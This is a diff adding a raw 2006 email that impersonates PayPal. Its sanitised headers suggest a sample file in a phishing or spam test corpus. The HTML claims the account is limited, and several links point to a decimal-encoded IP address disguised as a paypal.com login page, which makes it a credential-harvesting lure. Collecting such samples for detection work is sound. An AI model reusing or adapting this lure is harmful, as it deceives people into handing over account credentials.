@@ -1,0 +1,116 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 6907F46A2F;
+ Thu, 24 Aug 2006 22:29:47 -0400 (EDT)
+Received: from mail.com (adsl-209-30-251-137.dsl.bumttx.swbell.net
+ [209.30.251.137])
+ by mail.example.org (Postfix) with SMTP id 059E16CD168;
+ Thu, 24 Aug 2006 22:29:46 -0400 (EDT)
+Reply-To: <service@paypal.com>
+From: "PayPal" <service@paypal.com>
+Subject: Your account access has been limited
+Date: Thu, 24 Aug 2006 21:27:27 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060825022946.059E16CD168@mail.example.org>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 123
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Limited Account Access Details</title>
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xpt.css">
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xptInvoice.css">
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xptObsolete.css">
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/css/xptlive.css">
+<style type="text/css">
+<!--
+.pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+-->
+</style>
+<script src="https://www.paypalobjects.com/js/pp_main.js"></script>
+</head>
+<body><div>
+<div id="xptHeader">
+<DIV id=xptHeader0>
+
+&nbsp;</DIV>
+<DIV id=xptHeader1>
+
+<TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD noWrap><IMG alt="" src="http://images.paypal.com/en_US/i/logo/email_logo.gif" 
+border=0></TD>
+    <TD class=cobrand align=middle width="100%">&nbsp;</TD>
+    <TD noWrap align=right>&nbsp;</TD></TR></TBODY></TABLE></DIV>
+<DIV id=xptTabsBlueBar>
+<TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+	<td background="http://images.paypal.com/images/bg_clk.gif" width=100%><img src="http://images.paypal.com/images/pixel.gif" height="29" width="1" border="0"></td>
+</tr>	
+</table>
+</DIV>
+</div>
+
+<div id="xptContentMain"><table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
+<tr><td><img alt="" border="0" height="1" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="600"></td></tr>
+<tr><td><div id="xptTitle"><table align="center" border="0" cellpadding="0" cellspacing="0" class="main">
+<tr><td class="heading" width="100%"></td></tr>
+<tr><td><img alt="" border="0" height="2" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1"></td></tr>
+<tr><td><hr></td></tr>
+</table></div></td></tr>
+<tr><td valign="top"> PayPal is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to help us provide you with secure service. Until we can collect this information, your access to sensitive account features will be limited or terminated. We would like to restore your access as soon as possible, and we apologize for the inconvenience. 
+
+
+
+</td></tr>
+<tr><td valign="top"> <div>
+
+<div id="xptContentMain0">
+	<table align="center" border="0" cellpadding="0" cellspacing="0" width="600" id="table1">
+<tr><td valign="top"> <hr class="dotted">
+	<li>
+<span class="emphasis">Why is my account access limited?</span><br><br class="h6">Your account access has been limited for the following reason(s):<br><br><li>
+<span class="emphasis">Aug. 23, 2006: </span>We have reason to believe that your account was accessed by a third party. Because protecting the security of your account is our primary concern, we have limited access to sensitive PayPal account features. We understand that this may be an inconvenience but please understand that this temporary limitation is for your protection.</li>
+<br><br>(Your case ID for this reason is PP-121-601-924.)<p><br></p>
+<hr class="dotted">
+<span class="emphasis">How can I restore my account access?</span><br>
+<span class="emphasis"></span><br><br>
+<table align="center" bgcolor="#cc9999" cellpadding="1" cellspacing="0" width="100%" id="table2"><tr><td>
+	<table align="center" bgcolor="#ffeeee" cellpadding="5" cellspacing="0" width="100%" id="table3"><tr><td><span class="emphasis">Please visit the 
+		<a href="http://3508405025:81/paypal.com/login.html?https://www.paypal.com/cgi-bin/webscr?cmd=_login-run=updatete95ijfkdhyxncdg40sjmc34tssdf34fdt4g23fef45fg5?">Resolution Center</a> and complete the "Steps to Remove Limitations and Update your Account."  </span></td></tr></table></td></tr></table>
+<br>Completing all of the checklist items will automatically restore your account access.<br><hr class="dotted">
+
+
+
+</td></tr>
+</table></div>
+</div>
+	<p><font size="1"><font color="#808080">Please do not reply to this e-mail. Mail sent to this 
+
+address cannot be answered. For assistance, </font>
+	<a href="http://3508405025:81/paypal.com/login.html"><font color="#808080">log in</font></a><font color="#808080"> to your PayPal account and choose the "Help" link in the footer of any page.<BR>
+	</font></font><font color="#808080"><BR 
+class=h10></font><font size="1"><font color="#808080">To receive email notifications in plain text instead of HTML, update your preferences 
+	</font><a href="http://3508405025:81/paypal.com/login.html">
+	<font color="#808080">here</font></a><font color="#808080">. </font></font></p>
+	<p><SPAN class=pp_footer><font color="#808080" size="1">PayPal Email ID PP697</font></SPAN></p></td></tr>
+</table></div>
+</div></body>
+</html> 
